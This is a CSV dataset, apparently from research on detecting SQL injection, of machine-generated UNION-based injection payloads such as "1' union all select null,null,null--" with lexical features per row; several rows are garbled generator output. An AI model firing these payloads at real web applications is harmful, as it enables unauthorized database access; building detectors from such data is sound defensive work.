label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1' union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,35,60.0,15.0,3.0383787094137555,46.0,1.0,4.0,9.0,0.7666666666666667,0.016666666666666666,0.06666666666666667,0.15,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select 9346,7294,8979,7294,1249,9346,3084,7294,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,36,66.0,23.0,4.161353590002485,14.0,37.0,4.0,11.0,0.21212121212121213,0.5606060606060606,0.06060606060606061,0.16666666666666666,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,37,88.0,16.0,3.0021309232833655,42.0,1.0,30.0,15.0,0.4772727272727273,0.011363636363636364,0.3409090909090909,0.17045454545454544,0.0,1.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,6.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'   )    )    )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,38,93.0,16.0,2.9461352694362217,42.0,1.0,34.0,16.0,0.45161290322580644,0.010752688172043012,0.3655913978494624,0.17204301075268819,1.0,0.0,2.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,6.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,39,36.0,15.0,3.4438426267918225,26.0,1.0,4.0,5.0,0.7222222222222222,0.027777777777777776,0.1111111111111111,0.1388888888888889,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'  )   union all select select ,1249,8067,8067,8067,8067,9777,8067,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,40,74.0,23.0,4.079886135372972,20.0,33.0,9.0,12.0,0.2702702702702703,0.44594594594594594,0.12162162162162163,0.16216216216216217,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1  )   union all where 1646union -- 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,41,37.0,16.0,3.588529893979299,18.0,6.0,10.0,3.0,0.4864864864864865,0.16216216216216217,0.2702702702702703,0.08108108108108109,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'  )   union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,42,65.0,16.0,3.1283568411563656,46.0,1.0,8.0,10.0,0.7076923076923077,0.015384615384615385,0.12307692307692308,0.15384615384615385,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,43,88.0,16.0,3.0021309232833655,42.0,1.0,30.0,15.0,0.4772727272727273,0.011363636363636364,0.3409090909090909,0.17045454545454544,0.0,1.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,6.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,44,51.0,15.0,3.2044942858348717,38.0,1.0,4.0,8.0,0.7450980392156863,0.0196078431372549,0.0784313725490196,0.1568627450980392,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,45,61.0,15.0,3.0764633511418076,46.0,1.0,4.0,10.0,0.7540983606557377,0.01639344262295082,0.06557377049180328,0.16393442622950818,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,46,83.0,16.0,2.994545735737885,38.0,1.0,30.0,14.0,0.4578313253012048,0.012048192771084338,0.3614457831325301,0.1686746987951807,0.0,1.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,5.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1"")   as where 6621  =  (  )   as ilwhere 2774  =  (       )    )    )    )    )    )    -- mioel)    )    )   --  where 1917,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,47,141.0,26.0,3.2819665534469094,38.0,13.0,66.0,24.0,0.2695035460992908,0.09219858156028368,0.46808510638297873,0.1702127659574468,0.0,1.0,4.0,0.0,0.0,2.0,0.0,13.0,0.0,0.0,3.0,6.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1' union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,48,26.0,14.0,3.53257325750262,18.0,1.0,4.0,3.0,0.6923076923076923,0.038461538461538464,0.15384615384615385,0.11538461538461539,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,49,88.0,16.0,3.0021309232833655,42.0,1.0,30.0,15.0,0.4772727272727273,0.011363636363636364,0.3409090909090909,0.17045454545454544,0.0,1.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,6.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,50,61.0,15.0,3.0764633511418076,46.0,1.0,4.0,10.0,0.7540983606557377,0.01639344262295082,0.06557377049180328,0.16393442622950818,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,51,93.0,16.0,3.0033824020298776,46.0,1.0,30.0,16.0,0.4946236559139785,0.010752688172043012,0.3225806451612903,0.17204301075268819,0.0,1.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,7.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,52,56.0,15.0,3.1372483449403985,42.0,1.0,4.0,9.0,0.75,0.017857142857142856,0.07142857142857142,0.16071428571428573,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'  )   union all select null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,53,50.0,16.0,3.2985166738834373,34.0,1.0,8.0,7.0,0.68,0.02,0.16,0.14,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1  )   union all select 8391,5349#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,54,34.0,20.0,3.9476132088337668,14.0,9.0,8.0,3.0,0.4117647058823529,0.2647058823529412,0.23529411764705882,0.08823529411764706,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,55,51.0,15.0,3.2044942858348717,38.0,1.0,4.0,8.0,0.7450980392156863,0.0196078431372549,0.0784313725490196,0.1568627450980392,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'  )   union all o union o where    ,nullaan)      (  (    )    )    )    -- v  )    -- lunion all select select 3059,5087,5087,5087,8067,4273,1441,5087,5087,null,5087#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,56,169.0,31.0,4.036168829864658,53.0,41.0,50.0,25.0,0.3136094674556213,0.24260355029585798,0.2958579881656805,0.14792899408284024,1.0,0.0,4.0,0.0,0.0,0.0,0.0,8.0,0.0,0.0,11.0,4.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1' union all select  -- 7381,8067,8067,8067,8067,8067,9777--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,57,60.0,21.0,3.9563436209918734,14.0,29.0,6.0,11.0,0.23333333333333334,0.48333333333333334,0.1,0.18333333333333332,1.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-2088''  where 3900,3900,3900,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,58,35.0,14.0,3.413880159307602,5.0,20.0,3.0,7.0,0.14285714285714285,0.5714285714285714,0.08571428571428572,0.2,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,59,97.0,16.0,2.9222227985933076,46.0,1.0,34.0,16.0,0.4742268041237113,0.010309278350515464,0.35051546391752575,0.16494845360824742,0.0,1.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,7.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""   )    )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,60,108.0,16.0,2.9560933459331813,54.0,1.0,34.0,19.0,0.5,0.009259259259259259,0.3148148148148148,0.17592592592592593,0.0,1.0,2.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,9.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'   )    )    )    )    )    )    where 8890  =  2774 union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,61,93.0,26.0,3.4686735869984866,35.0,9.0,36.0,13.0,0.3763440860215054,0.0967741935483871,0.3870967741935484,0.13978494623655913,1.0,0.0,2.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,3.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1"" union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,62,51.0,15.0,3.2044942858348717,38.0,1.0,4.0,8.0,0.7450980392156863,0.0196078431372549,0.0784313725490196,0.1568627450980392,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,63,41.0,15.0,3.359306863497657,30.0,1.0,4.0,6.0,0.7317073170731707,0.024390243902439025,0.0975609756097561,0.14634146341463414,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1'  )   union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,64,31.0,15.0,3.4585663756578335,18.0,1.0,8.0,4.0,0.5806451612903226,0.03225806451612903,0.25806451612903225,0.12903225806451613,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1''  )    )    )    )    )    where select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,65,49.0,15.0,2.7901460075048403,15.0,1.0,24.0,9.0,0.30612244897959184,0.02040816326530612,0.4897959183673469,0.1836734693877551,2.0,0.0,2.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'  )   union all 5477  (      (    )   union where null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,66,63.0,20.0,3.389047383405287,26.0,5.0,24.0,8.0,0.4126984126984127,0.07936507936507936,0.38095238095238093,0.12698412698412698,1.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )    )    )    )    )    )    )    where il8890  =  4338 union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,67,115.0,25.0,3.4160879135936746,49.0,9.0,40.0,17.0,0.4260869565217391,0.0782608695652174,0.34782608695652173,0.14782608695652175,1.0,0.0,2.0,0.0,0.0,1.0,0.0,7.0,0.0,0.0,6.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'  )   union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,68,51.0,16.0,3.3338571891369,34.0,1.0,8.0,8.0,0.6666666666666666,0.0196078431372549,0.1568627450980392,0.1568627450980392,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1' union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,69,26.0,14.0,3.53257325750262,18.0,1.0,4.0,3.0,0.6923076923076923,0.038461538461538464,0.15384615384615385,0.11538461538461539,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1"" all where 6621  (    )   --  (    )   )    --   )    )   --  )    )    )    )    )    --  (       )    )    )    )    -- -- 1  (       --   )    )    )    --  where all where from 9357 where where 2887  (  (    )    )    union)   -- moo1845--  )   )    )    )    -- lwhere 4338  (  (    )    (    )    -- (    )   -- 2132#  )   -- 1917)     )   -- g$  (    )",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,70,361.0,29.0,2.6843141493311697,50.0,30.0,206.0,75.0,0.13850415512465375,0.08310249307479224,0.5706371191135734,0.2077562326869806,0.0,1.0,30.0,0.0,0.0,0.0,0.0,42.0,0.0,0.0,0.0,30.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
